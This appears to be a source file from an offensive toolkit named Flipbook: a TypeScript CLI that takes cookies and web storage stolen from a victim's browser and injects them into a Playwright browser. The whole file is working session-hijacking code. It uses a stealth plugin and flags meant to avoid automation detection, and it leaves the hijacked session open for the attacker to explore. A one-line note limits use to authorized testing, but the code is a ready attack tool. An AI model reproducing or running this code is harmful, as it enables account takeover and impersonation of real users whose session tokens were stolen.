#!/usr/bin/env tsx
/**
 * CLI tool for restoring stolen sessions into a local browser.
 * 
 * **Purpose:**
 * Takes cookies (and optionally localStorage/sessionStorage) extracted from
 * a victim's browser and injects them into a fresh Playwright browser context,
 * allowing the attacker to impersonate the victim's authenticated session.
 * 
 * **Usage:**
 * ```bash
 * # With cookies only
 * npm run session-restore -- --cookies cookies.json --url https://example.com
 * 
 * # With cookies and storage
 * npm run session-restore -- --cookies cookies.json --storage storage.json --url https://example.com
 * 
 * # Interactive mode (prompts for all inputs)
 * npm run session-restore
 * ```
 * 
 * **Input Files:**
 * - cookies.json: Array of SerializedCookie objects (from get_cookies command)
 * - storage.json: Object with localStorage and sessionStorage (from get_storage command)
 * 
 * **Process:**
 * 1. Load cookies and storage from JSON files
 * 2. Launch Playwright browser (non-headless for manual interaction)
 * 3. Inject cookies into browser context
 * 4. Navigate to target URL
 * 5. Inject localStorage and sessionStorage via JavaScript
 * 6. Reload page to apply all session data
 * 7. Wait for user to close browser (manual session exploration)
 * 
 * **Security Note:**
 * This tool demonstrates session hijacking capabilities. Use only for
 * authorized security testing and research purposes.
 */

import { readFile } from 'fs/promises';
import { chromium } from 'playwright-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { input } from '@inquirer/prompts';
import type { SerializedCookie } from '../src/types.js';

// Apply stealth plugin to avoid detection
chromium.use(StealthPlugin());

/**
 * Storage payload structure (matches session-extractor.ts output).
 */
interface StoragePayload {
  localStorage?: Record<string, string>;
  sessionStorage?: Record<string, string>;
}

/**
 * Parses command-line arguments into structured options.
 * 
 * Supported arguments:
 * - --cookies <path>: Path to cookies JSON file
 * - --storage <path>: Path to storage JSON file
 * - --url <url>: Target URL to open
 * 
 * @returns Parsed command-line options
 */
function parseArgs(): {
  cookiesFile?: string;
  storageFile?: string;
  url?: string;
} {
  const args = process.argv.slice(2);
  const result: { cookiesFile?: string; storageFile?: string; url?: string } = {};

  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--cookies' && args[i + 1]) result.cookiesFile = args[++i];
    if (args[i] === '--storage' && args[i + 1]) result.storageFile = args[++i];
    if (args[i] === '--url'     && args[i + 1]) result.url         = args[++i];
  }

  return result;
}

/**
 * Main function - runs the session restoration process.
 */
async function main(): Promise<void> {
  console.log('\n=== Flipbook: Session Restore ===\n');

  const args = parseArgs();

  // Prompt for cookies file path (required)
  const cookiesFile = args.cookiesFile ?? await input({
    message: 'Path to cookies JSON file:',
    validate: (v) => v.trim().length > 0 || 'Required',
  });

  // Prompt for target URL (required)
  const targetUrl = args.url ?? await input({
    message: 'Target URL to open:',
    validate: (v) => { try { new URL(v); return true; } catch { return 'Invalid URL'; } },
  });

  // Prompt for storage file path (optional)
  const storageFile = args.storageFile ?? await input({
    message: 'Path to storage JSON file (optional, Enter to skip):',
    default: '',
  });

  // Load cookies from JSON file
  const cookiesRaw = await readFile(cookiesFile.trim(), 'utf-8');
  const cookies: SerializedCookie[] = JSON.parse(cookiesRaw);

  // Load storage if provided
  let storage: StoragePayload = {};
  if (storageFile.trim()) {
    const storageRaw = await readFile(storageFile.trim(), 'utf-8');
    storage = JSON.parse(storageRaw) as StoragePayload;
  }

  console.log(`\nLoaded ${cookies.length} cookies. Launching browser...`);

  /**
   * Launch browser in non-headless mode for manual interaction.
   * 
   * Configuration:
   * - headless: false (visible browser window)
   * - no-sandbox: required for some environments
   * - disable-blink-features: avoid automation detection
   * - Empty user data dir: fresh profile for each session
   */
  const context = await chromium.launchPersistentContext('', {
    headless: false,
    args: [
      '--no-sandbox',
      '--disable-blink-features=AutomationControlled',
    ],
  });

  /**
   * Inject cookies into browser context.
   * 
   * Cookies are added before navigation to ensure they're available
   * when the page loads (important for authentication cookies).
   */
  await context.addCookies(
    cookies.map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      expires: c.expires > 0 ? c.expires : undefined,
      httpOnly: c.httpOnly,
      secure: c.secure,
      sameSite: normalizeSameSite(c.sameSite),
    })),
  );

  const page = await context.newPage();

  /**
   * Navigate to target URL first.
   * 
   * This is required before injecting localStorage/sessionStorage
   * because storage is origin-specific (same-origin policy).
   */
  await page.goto(targetUrl, { waitUntil: 'domcontentloaded' });

  /**
   * Inject localStorage if provided.
   * 
   * Uses page.evaluate() to run JavaScript in the page context,
   * which has access to the localStorage API.
   */
  if (storage.localStorage && Object.keys(storage.localStorage).length > 0) {
    await page.evaluate((data) => {
      Object.entries(data).forEach(([k, v]) => localStorage.setItem(k, v));
    }, storage.localStorage);
    console.log(`Injected ${Object.keys(storage.localStorage).length} localStorage entries.`);
  }

  /**
   * Inject sessionStorage if provided.
   * 
   * Similar to localStorage injection but for sessionStorage.
   */
  if (storage.sessionStorage && Object.keys(storage.sessionStorage).length > 0) {
    await page.evaluate((data) => {
      Object.entries(data).forEach(([k, v]) => sessionStorage.setItem(k, v));
    }, storage.sessionStorage);
    console.log(`Injected ${Object.keys(storage.sessionStorage).length} sessionStorage entries.`);
  }

  /**
   * Reload page to apply all session data.
   * 
   * Some sites check authentication on page load, so reloading
   * ensures cookies and storage are properly recognized.
   */
  await page.reload({ waitUntil: 'domcontentloaded' });
  console.log('\nSession restored. Browser is open — close the window when done.');

  /**
   * Wait for user to close the browser.
   * 
   * This allows manual exploration of the hijacked session.
   * The script will exit when the browser window is closed.
   */
  await new Promise<void>((resolve) => {
    context.on('close', resolve);
  });
}

/**
 * Normalizes SameSite attribute from our format to Playwright's format.
 * 
 * Our format uses 'no_restriction' for cookies without SameSite attribute.
 * Playwright expects undefined for this case.
 * 
 * @param s - SameSite value from our SerializedCookie format
 * @returns Playwright-compatible SameSite value
 */
function normalizeSameSite(s: string): 'Strict' | 'Lax' | 'None' | undefined {
  if (s === 'Strict') return 'Strict';
  if (s === 'Lax') return 'Lax';
  if (s === 'None') return 'None';
  return undefined;
}

// Run main function and handle errors
main().catch((err) => {
  console.error(err);
  process.exit(1);
});